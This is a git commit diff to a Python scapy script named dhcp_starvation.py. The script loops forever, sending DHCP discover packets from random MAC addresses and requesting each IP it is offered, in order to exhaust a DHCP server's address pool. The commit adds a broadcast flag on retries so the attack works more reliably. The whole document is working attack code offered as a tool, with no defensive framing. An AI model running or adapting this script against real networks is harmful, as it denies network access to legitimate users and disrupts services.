6c099e1eabcd465bff99b307dc0ea68e0cb23944
Lassi <lassi@localhost.localdomain>
2025-06-03 19:13:13 +0300

    directory

--- dhcp-starvation/dhcp_starvation.py
+++ dhcp-starvation/dhcp_starvation.py
@@ -3,11 +3,11 @@ from scapy.all import *
 def mac_to_bytes(mac_addr: str) -> bytes:
     return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")
 
-def send_discover(src_mac, random_xid):
+def send_discover(src_mac, random_xid, flag):
     pkt = Ether(dst = "ff:ff:ff:ff:ff:ff", src = src_mac, type = 0x0800)
     pkt /= IP(src = "0.0.0.0", dst = "255.255.255.255")
     pkt /= UDP(dport = 67, sport = 68)
-    pkt /= BOOTP(op = 1, htype = 1, hlen = 6, chaddr = mac_to_bytes(src_mac), xid = random_xid)
+    pkt /= BOOTP(op = 1, htype = 1, hlen = 6, flags = flag, chaddr = mac_to_bytes(src_mac), xid = random_xid)
     #pkt /= BOOTP(op = 1, htype = 1, hlen = 6, chaddr = src_mac, xid = random_xid)
     pkt /= DHCP(options = [("message-type", "discover"), "end"])
     sendp(pkt, verbose=False)
@@ -27,19 +27,16 @@ def main():
     while True:
         mac = str(RandMAC())
         xid = random.randint(1, 1000000000)
-        send_discover(mac, xid)
+        send_discover(mac, xid, 0)
         offer = sniff(filter="udp and (port 67 or port 68)", timeout = 2)
-
         count = 0
         while len(offer) <= 0 and count < 1:
-            send_discover(mac, xid)
+            send_discover(mac, xid, 32768)
             offer = sniff(filter="udp and (port 67 or port 68)", timeout = 2)
             count += 1
-            
         if len(offer) > 0:
             offer_ip = str(offer[0][BOOTP].yiaddr)
             send_request(mac, offer_ip, xid)
-            
         print("Swapping xid.")
 
 main()
